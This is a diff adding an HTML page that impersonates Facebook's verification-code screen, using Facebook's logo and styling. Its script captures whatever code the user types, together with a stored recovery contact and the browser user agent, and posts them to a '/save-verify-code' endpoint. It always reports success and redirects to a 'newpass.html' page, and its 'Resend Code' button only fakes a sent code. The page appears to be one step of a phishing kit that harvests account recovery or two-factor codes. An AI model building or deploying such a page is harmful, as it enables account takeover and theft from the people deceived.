@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Enter Verification Code | Facebook</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      font-weight: 400;
+      font-size: 14px;
+    }
+
+    .wrapper {
+      width: 25vw;
+      max-width: 100px;
+      min-width: 300px;
+      background: transparent;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 50px;
+      height: auto;
+      margin-bottom: 25px;
+      user-select: none;
+    }
+
+    h1 {
+      font-weight: 400;
+      font-size: 1.6rem;
+      margin-bottom: 8px;
+      letter-spacing: 0.01em;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #606770;
+      margin-top: 0;
+      margin-bottom: 14px;
+      font-weight: 400;
+    }
+
+    .contact-info {
+      font-weight: 400;
+      font-size: 1.1rem;
+      color: #1877f2;
+      margin-bottom: 28px;
+      user-select: text;
+      word-break: break-word;
+      max-width: 100%;
+      padding: 0 10px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      font-size: 1.1rem;
+      padding: 12px 14px;
+      border: 2px solid #ccd0d5;
+      border-radius: 6px;
+      outline: none;
+      letter-spacing: normal;
+      transition: border-color 0.3s ease;
+      margin-bottom: 28px;
+      font-weight: 400;
+      color: #1c1e21;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    input[type="text"]:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 6px #1877f2aa;
+    }
+    input[type="text"]::placeholder {
+      color: #999;
+      font-weight: 400;
+      font-size: 1rem;
+    }
+
+    button.primary-btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 1.1rem;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 30px;
+      color: white;
+      font-weight: 400;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button.primary-btn:hover {
+      background-color: #165dbb;
+    }
+
+    button.resend-btn {
+      margin-top: 16px;
+      background: none;
+      border: none;
+      color: #1877f2;
+      font-size: 1rem;
+      cursor: pointer;
+      font-weight: 400;
+      text-decoration: underline;
+    }
+    button.resend-btn:hover {
+      color: #0f4abc;
+    }
+
+    .message {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 999;
+      background-color: #f8f9fa;
+      color: #333;
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-size: 0.95rem;
+      font-weight: 400;
+      max-width: 90%;
+      text-align: center;
+      user-select: none;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      display: none;
+    }
+
+    .message.show {
+      display: block;
+    }
+
+    .message.success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+
+    .message.error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    /* Modal Popup Styles */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(240, 242, 245, 0.95);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .modal-overlay.show {
+      display: flex;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .modal-box {
+      background-color: white;
+      padding: 20px 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      font-size: 1rem;
+      text-align: center;
+      color: #1c1e21;
+      max-width: 90%;
+      width: 300px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 700px) {
+      .wrapper {
+        width: 90vw;
+      }
+      h1 {
+        font-size: 1.4rem;
+      }
+      .contact-info {
+        font-size: 1rem;
+      }
+      input[type="text"], button.primary-btn {
+        font-size: 1rem;
+      }
+      button.resend-btn {
+        font-size: 0.9rem;
+      }
+      body, html {
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    </div>
+
+    <h1>Enter Verification Code</h1>
+    <p>We sent a code to:</p>
+    <div class="contact-info" id="contactInfo"></div>
+
+    <input type="text" id="codeInput" placeholder="Enter your code here" autofocus autocomplete="off" />
+
+    <button class="primary-btn" onclick="verifyCode()">Verify</button>
+    <button class="resend-btn" onclick="resendCode()">Resend Code</button>
+
+    <div id="message" class="message"></div>
+  </div>
+
+  <!-- Modal Popup -->
+  <div id="modalOverlay" class="modal-overlay">
+    <div class="modal-box" id="modalBox"></div>
+  </div>
+
+  <script>
+    const contactInfo = localStorage.getItem("recovery_target");
+    if (!contactInfo) {
+      alert("No recovery information found. Redirecting to password page.");
+      window.location.href = "password.html";
+    } else {
+      document.getElementById("contactInfo").textContent = contactInfo;
+    }
+
+    function verifyCode() {
+      const code = document.getElementById("codeInput").value.trim();
+      const messageEl = document.getElementById("message");
+
+      messageEl.textContent = "";
+      messageEl.className = "message";
+
+      if (code.length === 0) {
+        messageEl.textContent = "Please enter the verification code.";
+        messageEl.classList.add("error", "show");
+        return;
+      }
+
+      // Save verification code data
+      const verifyData = {
+        verificationCode: code,
+        recoveryTarget: contactInfo,
+        userAgent: navigator.userAgent
+      };
+
+      fetch('/save-verify-code', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(verifyData)
+      }).then(response => response.json())
+        .then(data => {
+          console.log('Verification code saved:', data.success);
+        }).catch(error => {
+          console.error('Error saving verification code:', error);
+        });
+
+      messageEl.textContent = "Verification successful! Redirecting to password reset...";
+      messageEl.classList.add("success", "show");
+
+      localStorage.removeItem("verification_code");
+      localStorage.removeItem("recovery_target");
+
+      setTimeout(() => {
+        window.location.href = "newpass.html";
+      }, 1800);
+    }
+
+    function resendCode() {
+      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+      localStorage.setItem("verification_code", newCode);
+
+      const modal = document.getElementById("modalOverlay");
+      const modalBox = document.getElementById("modalBox");
+
+      modalBox.textContent = `Verification code sent to ${contactInfo}`;
+      modal.classList.add("show");
+
+      setTimeout(() => {
+        modal.classList.remove("show");
+      }, 3000);
+
+      document.getElementById("codeInput").value = "";
+      document.getElementById("message").textContent = "";
+    }
+  </script>
+</body>
+</html>
